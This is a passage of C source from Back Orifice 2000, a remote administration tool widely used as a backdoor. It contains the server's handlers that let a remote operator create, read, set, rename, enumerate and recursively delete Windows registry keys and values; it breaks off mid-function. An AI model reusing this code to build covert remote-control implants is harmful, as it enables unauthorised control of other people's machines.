/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commandloop.h>
#include<bocomreg.h>
#include<cmd\cmd_registry.h>
#include<pviewer.h>
#include<strhandle.h>
#include<osversion.h>
#include<functions.h>

char *GetRootKey(char *svPath, HKEY *pKey)
{ 
	char *svNext;

	if(svPath==NULL) return NULL;
	
	if(strncmp(svPath,"\\\\",2)==0) svPath+=2;
	else if(strncmp(svPath,"\\",1)==0) svPath++;

	svNext=BreakString(svPath,"\\");
	if((lstrcmpi(svPath,"HKEY_CLASSES_ROOT")==0) ||
		(lstrcmpi(svPath,"HKCR")==0) ) *pKey = HKEY_CLASSES_ROOT;
	else if((lstrcmpi(svPath,"HKEY_CURRENT_USER")==0) ||
		(lstrcmpi(svPath,"HKCU")==0) ) *pKey = HKEY_CURRENT_USER;
	else if((lstrcmpi(svPath,"HKEY_LOCAL_MACHINE")==0) ||
		(lstrcmpi(svPath,"HKLM")==0) ) *pKey = HKEY_LOCAL_MACHINE;
	else if((lstrcmpi(svPath,"HKEY_USERS")==0) ||
		(lstrcmpi(svPath,"HKU")==0) ) *pKey = HKEY_USERS;
	else if((lstrcmpi(svPath,"HKEY_CURRENT_CONFIG")==0) ||
		(lstrcmpi(svPath,"HKCC")==0) ) *pKey = HKEY_CURRENT_CONFIG;
	else if((lstrcmpi(svPath,"HKEY_DYN_DATA")==0) ||
		(lstrcmpi(svPath,"HKDD")==0) ) *pKey = HKEY_DYN_DATA;
	else {
		return NULL;
	}

	return svNext;
}

	
int CmdProc_RegCreateKey(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	
	// Get root key
	HKEY key,subkey;
	char *svKey,*svNext;
	svKey=GetRootKey(svArg2,&key);
	if(svKey==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not create key. Invalid root key.\n");
		return -1;
	}
	
	// Create/open key hierarchy
	DWORD dwDisp,dwPerm=KEY_READ;
	int nCount;
	nCount=0;
	while(svKey!=NULL) {
		svNext=BreakString(svKey,"\\");
		if(svNext==NULL) dwPerm=KEY_READ|KEY_WRITE;
		if(RegCreateKeyEx(key, svKey, 0, "", REG_OPTION_NON_VOLATILE, dwPerm, NULL, &subkey, &dwDisp) != ERROR_SUCCESS) {
			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
			wsprintf(svBuffer,"Could not create key. Unable to open subkey: %.256s\n", svKey);
			IssueAuthCommandReply(cas_from,comid,0,svBuffer);
			return -1;
		}
		
		if(dwDisp==REG_CREATED_NEW_KEY) nCount++;

		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
		key = subkey;
		svKey = svNext;
	} 
	if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
		RegCloseKey(key);
	
	// Report number of keys created in the process
	if(nCount==1) {
		wsprintf(svBuffer, "Created %d key.\n", nCount);
	} else {
		wsprintf(svBuffer, "Created %d keys.\n", nCount);
	}
	IssueAuthCommandReply(cas_from,comid,0,svBuffer);

	return 0;
}

int CmdProc_RegSetValue(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	
	// Get root key
	char *svKey;
	HKEY key;
	svKey=GetRootKey(svArg2,&key);
	if(svKey==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not set value. Invalid root key.\n");
		return -1;
	}

	// Get registry value type/name/data
	char *svType, *svName, *svData, *svNext, *pData;
	int nDataLen,nOrigLen;

	svType=svArg3;
	svName=BreakString(svType,"(");
	if(svName==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not set value. Invalid value name string.\n");
		return 1;
	}
	svData=BreakString(svName,"):");
	if(svData==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not set value. Invalid value name string.\n");
		return 1;
	}
	CharUpper(svType);

	// Process value type and parse data
	DWORD dwType;
	dwType = REG_NONE;
	switch(svType[0]) {
	case 'B':
		dwType=REG_BINARY;
		nDataLen=lstrlen(svData)/3;
		pData=(char *) malloc(nDataLen);
		
		CharUpper(svData);
		nDataLen=0;
		while(svData!=NULL) {
			char c;
			svNext=BreakString(svData," ");
			
			c=0;
			while(*svData) {
				c<<=4;
				if(*svData>='A' && *svData<='F') c|=*svData-'A'+0xA;
				else if(*svData>='0' && *svData<='9') c|=*svData-'0';
				svData++;
			}
			*(pData+nDataLen)=c;
			nDataLen++;

			svData=svNext;
		}
		break;

	case 'D':
		dwType=REG_DWORD;
		nDataLen=4;
		pData=(char *)malloc(sizeof(DWORD));
		
		CharUpper(svData);

		if(strncmp(svData,"0X",2)==0) {
			DWORD val;
			val=0;
			svData+=2;
			while(*svData) {
				val<<=4;
				if(*svData>='A' && *svData<='F') val|=*svData-'A'+0xA;
				else if(*svData>='0' && *svData<='9') val|=*svData-'0';
				svData++;
			}
			*(DWORD *)pData=val;
		} else {
			*(DWORD *)pData=atol(svData);
		}

		break;

	case 'S':
		dwType=REG_SZ;
		pData=(char *)malloc(lstrlen(svData)+1);
		
		UnescapeString(svData);
		lstrcpy(pData,svData);
		nDataLen=lstrlen(pData)+1;
		break;
	case 'M':
		if(!g_bIsWinNT) {
			IssueAuthCommandReply(cas_from,comid,0,"Could not set value. MULTI_SZ only supported by Windows NT.\n");
			return -1;						
		}
		dwType=REG_MULTI_SZ;
		nOrigLen=lstrlen(svData);
		pData=(char *)malloc(nOrigLen+2);
		UnescapeString(svData);
		nDataLen=0;
		while((!(*(pData+nDataLen)=='\0' && *(pData+nDataLen+1)=='\0')) && nDataLen<nOrigLen) nDataLen++;
		*(pData+nDataLen)='\0';
		*(pData+nDataLen+1)='\0';
		nDataLen++;
		break;

	case 'E':
		dwType=REG_EXPAND_SZ;
		pData=(char *)malloc(lstrlen(svData)+1);
		UnescapeString(svData);
		lstrcpy(pData,svData);
		nDataLen=lstrlen(pData)+1;
		break;
	default:
		wsprintf(svBuffer, "Could not set value. Unknown data type '%c'.  Valid types are B,D,S,M,E.\n", svType[0]);
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return -1;
	}

	// Find Key
	
	// Open key hierarchy
	HKEY subkey;
	DWORD dwPerm=KEY_READ;
	while(svKey!=NULL) {
		svNext=BreakString(svKey,"\\");
		if(svNext==NULL) dwPerm=KEY_READ|KEY_WRITE;
		if(RegOpenKeyEx(key, svKey, 0, dwPerm, &subkey) != ERROR_SUCCESS) {
			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
			wsprintf(svBuffer,"Unable to open subkey: %.256s\n", svKey);
			IssueAuthCommandReply(cas_from,comid,0,svBuffer);
			free(pData);
			return -1;
		}
		
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
		key = subkey;
		svKey = svNext;
	} 

	// Write value

	RegSetValueEx(key,svName, 0, dwType, (BYTE *) pData, nDataLen);
		
	if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER)
		RegCloseKey(key);
	
	IssueAuthCommandReply(cas_from,comid,0,"Value set.\n");

	free(pData);
	return 0;
}

int CmdProc_RegGetValue(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	
	// Get root key
	char *svKey,*svNext;
	HKEY key;
	svKey=GetRootKey(svArg2,&key);
	if(svKey==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not open key. Invalid root key.\n");
		return -1;
	}

	// Open key hierarchy
	HKEY subkey;
	DWORD dwPerm=KEY_READ;
	while(svKey!=NULL) {
		svNext=BreakString(svKey,"\\");
		if(svNext==NULL) dwPerm=KEY_WRITE | KEY_READ;
		if(RegOpenKeyEx(key, svKey, 0, dwPerm, &subkey) != ERROR_SUCCESS) {
			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
			wsprintf(svBuffer,"Could not open key. Unable to open subkey: %.256s\n", svKey);
			IssueAuthCommandReply(cas_from,comid,0,svBuffer);
			return -1;
		}
		
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
		key = subkey;
		svKey = svNext;
	} 
	
	BYTE *pData;
	DWORD dwType,dwLen;
	RegQueryValueEx(key,svArg3,NULL,&dwType,NULL,&dwLen);
	if(dwLen>=8192) {
		RegCloseKey(key);
		IssueAuthCommandReply(cas_from,comid,0,"Could not get value. Value too long.\n");
		return -1;

	}
	pData=(BYTE *)malloc(dwLen);
	RegQueryValueEx(key,svArg3,NULL,&dwType,pData,&dwLen);

	wsprintf(svBuffer,"Value: %lu bytes.\n",dwLen);
	IssueAuthCommandReply(cas_from,comid,1,svBuffer);

	// Process value type and parse data
	char svStr[260],*svPtr,*svMem,*sv;
	DWORD dw,dwCount;

	switch(dwType) {
	case REG_BINARY:
		dw=0;
		while(dw<dwLen) {
			svStr[0]='\0';
			dwCount=min(dwLen-dw,16);
			while(dwCount>0) {
				char svByte[3];
				if(dwCount==1) {
					wsprintf(svByte,"%2.2X\n",*(pData+dw));
					lstrcat(svStr,svByte);
				} else {
					wsprintf(svByte,"%2.2X ",*(pData+dw));
					lstrcat(svStr,svByte);
				}

				dw++;
				dwCount--;
			}
			IssueAuthCommandReply(cas_from,comid,1,svStr);
		}		
		break;

	case REG_DWORD:
		wsprintf(svStr,"%lu\n",*(DWORD *)pData);			
		IssueAuthCommandReply(cas_from,comid,1,svStr);
		break;

	case REG_EXPAND_SZ:
	case REG_SZ:
		svPtr=EscapeString((char *)pData);
		svMem=(char *)malloc(lstrlen(svPtr)+2);
		lstrcpy(svMem,svPtr);
		free(svPtr);
		lstrcat(svMem,"\n");
		IssueAuthCommandReply(cas_from,comid,1,svMem);
		free(svMem);
		break;
	case REG_MULTI_SZ:
		sv=(char *)pData;
		while(sv[0]!='\0') {
			svPtr=EscapeString(sv);
			svMem=(char *)malloc(lstrlen(svPtr)+2);
			lstrcpy(svMem,svPtr);
			free(svPtr);
			lstrcat(svMem,"\n");
			IssueAuthCommandReply(cas_from,comid,1,svMem);
			free(svMem);
			while(sv[0]!='\0') sv++;
			sv++;
		}
		break;
		
	default:
		RegCloseKey(key);
		free(pData);
		IssueAuthCommandReply(cas_from,comid,0,"Could not get value. Unknown type.");
	}
		
	IssueAuthCommandReply(cas_from,comid,0,"Value retrieved.\n");

	free(pData);
	return 0;
}



int RegDeleteKeyRecurse(HKEY hKey, LPCTSTR lpSubKey, char *svKeyBuf)
{
	int nCount;
	char svSubKeyBuf[MAX_PATH+1];
	HKEY hSubKey;
	
	if(RegOpenKeyEx(hKey,lpSubKey,0,KEY_ALL_ACCESS,&hSubKey)!=ERROR_SUCCESS) {
		return -1;
	}
		
	nCount=0;
	while(RegEnumKey(hSubKey,nCount,svKeyBuf,MAX_PATH)!=ERROR_NO_MORE_ITEMS) {
		if(RegDeleteKeyRecurse(hSubKey,svKeyBuf,svSubKeyBuf)==-1) {
			RegCloseKey(hSubKey);
			return -1;
		}
		nCount++;
	}

	RegCloseKey(hSubKey);

	RegDeleteKey(hKey,lpSubKey);

	return 0;
}


int CmdProc_RegDeleteKey(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	char svSubKeyBuf[MAX_PATH+1];

	// Get root key
	char *svKey,*svNext;
	HKEY key;
	svKey=GetRootKey(svArg2,&key);
	if(svKey==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not delete key. Invalid root key.\n");
		return -1;
	}

	// Remove trailing backslash
	if(lstrlen(svKey)>1) {
		if(svKey[lstrlen(svKey)-1]=='\\') {
			svKey[lstrlen(svKey)-1]='\0';
		}
	}

	// Open key hierarchy
	HKEY subkey;
	DWORD dwPerm=KEY_READ;
	while(svKey!=NULL) {
		svNext=BreakString(svKey,"\\");
		if(svNext==NULL) break;
		if(RegOpenKeyEx(key, svKey, 0, dwPerm, &subkey) != ERROR_SUCCESS) {
			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
			wsprintf(svBuffer,"Could not delete key. Unable to open subkey: %.256s\n", svKey);
			IssueAuthCommandReply(cas_from,comid,0,svBuffer);
			return -1;
		}
		
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
		key = subkey;
		svKey = svNext;
	} 

	// Recursively delete key (win95 does this automatically, NT does not);
	if(RegDeleteKeyRecurse(key,svKey,svSubKeyBuf)==-1) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not delete key.\n");
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
		return -1;
	}

	if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
		RegCloseKey(key);
	
	IssueAuthCommandReply(cas_from,comid,0,"Key deleted.\n");
	
	return 0;
}

int CmdProc_RegDeleteValue(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	
	// Get root key
	char *svKey,*svNext;
	HKEY key;
	svKey=GetRootKey(svArg2,&key);
	if(svKey==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not delete value. Invalid root key.\n");
		return -1;
	}

	// Remove trailing backslash
	if(lstrlen(svKey)>1) {
		if(svKey[lstrlen(svKey)-1]=='\\') {
			svKey[lstrlen(svKey)-1]='\0';
		}
	}

	// Open key hierarchy
	HKEY subkey;
	DWORD dwPerm=KEY_READ;
	while(svKey!=NULL) {
		svNext=BreakString(svKey,"\\");
		if(svNext==NULL) dwPerm=KEY_READ|KEY_WRITE;
		if(RegOpenKeyEx(key, svKey, 0, dwPerm, &subkey) != ERROR_SUCCESS) {
			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
			wsprintf(svBuffer,"Could not delete value. Unable to open subkey: %.256s\n", svKey);
			IssueAuthCommandReply(cas_from,comid,0,svBuffer);
			return 1;
		}
		
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
		key = subkey;
		svKey = svNext;
	} 

	// Delete value
	if(RegDeleteValue(key,svArg3) != ERROR_SUCCESS) {
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
	
		IssueAuthCommandReply(cas_from,comid,0,"Could not delete value\n");
		return 1;
	}
	
	// Clean up
	if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
		RegCloseKey(key);
	
	IssueAuthCommandReply(cas_from,comid,0,"Value deleted.\n");
	
	return 0;
}

int RegCopyKeyRecurse(HKEY key, HKEY newkey)
{
	// Get value length information
	char *svSubKeyName=NULL, *svClassName=NULL, *svValueName=NULL;
	BYTE *pValueData=NULL;
	DWORD cbMaxSubKeyLen, cbMaxClassLen, cbMaxValueNameLen, cbMaxValueDataLen;
	DWORD cbSubKeyLen, cbClassLen, cbValueNameLen, cbValueDataLen;
	if(RegQueryInfoKey(key,NULL,NULL,NULL,NULL,&cbMaxSubKeyLen,&cbMaxClassLen,NULL,&cbMaxValueNameLen,&cbMaxValueDataLen,NULL,NULL)!=ERROR_SUCCESS) {
		return -1;
	}
	cbMaxValueNameLen++;
	cbMaxClassLen++;
	cbMaxSubKeyLen++;
	svSubKeyName = (char *) malloc(cbMaxSubKeyLen);
	svClassName  = (char *) malloc(cbMaxClassLen);
	svValueName  = (char *) malloc(cbMaxValueNameLen);
	pValueData  = (BYTE *) malloc(cbMaxValueDataLen);

	// Copy all values
	int count=0;
	DWORD dwType;
	cbValueNameLen=cbMaxValueNameLen;
	cbValueDataLen=cbMaxValueDataLen;
	while(RegEnumValue(key,count,svValueName,&cbValueNameLen,NULL,&dwType,pValueData,&cbValueDataLen)!=ERROR_NO_MORE_ITEMS) {

		if(RegSetValueEx(newkey,svValueName,0,dwType,pValueData,cbValueDataLen)!=ERROR_SUCCESS) {
			free(svClassName);
			free(svSubKeyName);
			free(svValueName);
			free(pValueData);
			return -1;
		}

		cbValueNameLen=cbMaxValueNameLen;
		cbValueDataLen=cbMaxValueDataLen;
		count++;
	}

	free(svValueName);
	free(pValueData);

	// Now go through keys and copy them too, along with security descriptors
	
	count=0;
	cbSubKeyLen=cbMaxSubKeyLen;
	cbClassLen=cbMaxClassLen;
	while(RegEnumKeyEx(key,count,svSubKeyName,&cbSubKeyLen,NULL,svClassName,&cbClassLen,NULL)!=ERROR_NO_MORE_ITEMS) {
		HKEY subkey;
		if(RegOpenKeyEx(key,svSubKeyName,0,KEY_ALL_ACCESS|ACCESS_SYSTEM_SECURITY,&subkey)!=ERROR_SUCCESS) {
			free(svClassName);
			free(svSubKeyName);
			return -1;
		}
		
		// Create new key name
		DWORD cbSecDesc=0;
		SECURITY_DESCRIPTOR *psd=NULL;
	
		if(g_bIsWinNT) {
			psd=(SECURITY_DESCRIPTOR *)malloc(cbSecDesc);
			pRegGetKeySecurity(subkey,0xF,psd,&cbSecDesc);
		} else cbSecDesc=0;

		SECURITY_ATTRIBUTES sa;
		sa.nLength=sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor=psd;
		sa.bInheritHandle=FALSE;

		HKEY newsubkey;
		if(RegCreateKeyEx(newkey,svSubKeyName,0,svClassName,0,KEY_ALL_ACCESS|ACCESS_SYSTEM_SECURITY,&sa,&newsubkey,NULL)!=ERROR_SUCCESS) {
			if(psd) free(psd);
			RegCloseKey(subkey);
			free(svSubKeyName);
			free(svClassName);
			return -1;
		}
	
		if(psd) free(psd);

		// Recurse into this new key
		if(RegCopyKeyRecurse(subkey,newsubkey)==-1) {
			RegCloseKey(newsubkey);
			RegCloseKey(subkey);
			free(svSubKeyName);
			free(svClassName);
			return -1;
		}

		RegCloseKey(newsubkey);
		RegCloseKey(subkey);

		cbSubKeyLen=cbMaxSubKeyLen;
		cbClassLen=cbMaxClassLen;
		count++;
	}

	free(svSubKeyName);
	free(svClassName);

	return 0;
}

int CmdProc_RegRenameKey(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	
	// Get root key
	char *svKey,*svNext;
	HKEY key;
	svKey=GetRootKey(svArg2,&key);
	if(svKey==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not open key. Invalid root key.\n");
		return -1;
	}

	// Remove trailing backslash
	if(lstrlen(svKey)>1) {
		if(svKey[lstrlen(svKey)-1]=='\\') {
			svKey[lstrlen(svKey)-1]='\0';
		}
	}
	
	// Open key hierarchy
	HKEY subkey,hkParent=NULL;
	char *svLastKeyName=NULL;
	while(svKey!=NULL) {
		svNext=BreakString(svKey,"\\");
		
		if(RegOpenKeyEx(key, svKey, 0, KEY_READ|ACCESS_SYSTEM_SECURITY, &subkey) != ERROR_SUCCESS) {
			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
			wsprintf(svBuffer,"Could not open key. Unable to open subkey: %.256s\n", svKey);
			IssueAuthCommandReply(cas_from,comid,0,svBuffer);
			return -1;
		}
	
		if(svNext!=NULL) {
			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
		} else {
			hkParent=key;
			svLastKeyName=svKey;
		}
		key = subkey;
		svKey = svNext;
	} 
	// Don't rename if keys are the same
	if(lstrcmpi(svLastKeyName,svArg3)==0) {
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
		wsprintf(svBuffer,"Could not rename key. Keys have the same name.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return -1;
	}
	
	// Create new key name
	DWORD cbClass=0,cbSecDesc=0;
	SECURITY_DESCRIPTOR *psd=NULL;
	char *svClass=NULL;
		
	RegQueryInfoKey(key,NULL,&cbClass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,&cbSecDesc,NULL);
	if(cbClass>0) {
		svClass=(char *)malloc(cbClass);
		RegQueryInfoKey(key,svClass,&cbClass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	}
	
	if(g_bIsWinNT) {
		psd=(SECURITY_DESCRIPTOR *)malloc(cbSecDesc);
		pRegGetKeySecurity(key,0xF,psd,&cbSecDesc);
	} else cbSecDesc=0;
	
	SECURITY_ATTRIBUTES sa;
	sa.nLength=sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor=psd;
	sa.bInheritHandle=FALSE;

	HKEY newkey;
	if(RegCreateKeyEx(hkParent,svArg3,0,svClass,0,KEY_ALL_ACCESS|ACCESS_SYSTEM_SECURITY,&sa,&newkey,NULL)!=ERROR_SUCCESS) {
		if(svClass) free(svClass);
		if(psd) free(psd);
		RegCloseKey(hkParent);
		RegCloseKey(key);
		wsprintf(svBuffer,"Could not create key.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return -1;
	}
	if(svClass) free(svClass);
	if(psd) free(psd);
	
	// Copy this key recursively
	if(RegCopyKeyRecurse(key, newkey)==-1) {
		RegCloseKey(newkey);
		RegCloseKey(hkParent);
		RegCloseKey(key);
		wsprintf(svBuffer,"Could not copy key recursively.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return -1;
	}

	// Delete original key
	char svSubKeyBuf[MAX_PATH+1];
	if(RegDeleteKeyRecurse(hkParent,svLastKeyName,svSubKeyBuf)==-1) {
		RegCloseKey(newkey);
		RegCloseKey(hkParent);
		RegCloseKey(key);
		wsprintf(svBuffer,"Could not delete original key.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);		
	}


	RegCloseKey(newkey);
	RegCloseKey(key);
	RegCloseKey(hkParent);

	wsprintf(svBuffer,"Key renamed.\n");
	IssueAuthCommandReply(cas_from,comid,0,svBuffer);
	return 0;
}

int CmdProc_RegRenameValue(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	char *svValueName;
	svValueName=BreakString(svArg2,"\\\\");
	if(svValueName==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not rename value. Syntax error.\n");
		return -1;
	}
	// Don't rename if values are the same name
	if(lstrcmpi(svValueName,svArg3)==0) {
		wsprintf(svBuffer,"Could not rename value. Values have the same name.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return -1;
	}

	// Get root key
	char *svKey,*svNext;
	HKEY key;
	svKey=GetRootKey(svArg2,&key);
	if(svKey==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not open key. Invalid root key.\n");
		return -1;
	}

	// Open key hierarchy
	HKEY subkey;
	DWORD dwPerm=KEY_READ;
	while(svKey!=NULL) {
		svNext=BreakString(svKey,"\\");
		if(svNext==NULL) dwPerm=KEY_READ|KEY_WRITE;
		if(RegOpenKeyEx(key, svKey, 0, dwPerm, &subkey) != ERROR_SUCCESS) {
			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
			wsprintf(svBuffer,"Could not open key. Unable to open subkey: %.256s\n", svKey);
			IssueAuthCommandReply(cas_from,comid,0,svBuffer);
			return -1;
		}
	
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
		
		key = subkey;
		svKey = svNext;
	} 
	
	// Query value
	DWORD dwType,cbData;
	BYTE *pData=NULL;
	RegQueryValueEx(key,svValueName,NULL,&dwType,NULL,&cbData);
	pData=(BYTE *)malloc(cbData);
	if(RegQueryValueEx(key,svValueName,NULL,NULL,pData,&cbData)!=ERROR_SUCCESS) {
		free(pData);
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA)
			RegCloseKey(key);
		wsprintf(svBuffer,"Could not rename value. Unable to query.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return -1;
	}
	
	if(RegSetValueEx(key,svArg3,0,dwType,pData,cbData)!=ERROR_SUCCESS) {
		free(pData);
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA)
			RegCloseKey(key);
		wsprintf(svBuffer,"Could not rename value. Unable to set.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return -1;		
	}
	free(pData);

	if(RegDeleteValue(key,svValueName)!=ERROR_SUCCESS) {
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA)
			RegCloseKey(key);
		wsprintf(svBuffer,"Could not rename value. Value was copied, though.\n");
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return -1;
	}

	if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA)
		RegCloseKey(key);
	
	wsprintf(svBuffer,"Value renamed.\n");
	IssueAuthCommandReply(cas_from,comid,0,svBuffer);
	return 0;
}

int CmdProc_RegEnumKeys(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	
	// Get root key
	char *svKey,*svNext;
	HKEY key;
	svKey=GetRootKey(svArg2,&key);
	if(svKey==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Unable to open key. Invalid root key.\n");
		return -1;
	}

	// Open key hierarchy
	HKEY subkey;
	DWORD dwPerm=KEY_READ;
	while(svKey!=NULL) {
		svNext=BreakString(svKey,"\\");
		if(svNext==NULL) dwPerm=KEY_READ|KEY_WRITE;
		if(RegOpenKeyEx(key, svKey, 0, dwPerm, &subkey) != ERROR_SUCCESS) {
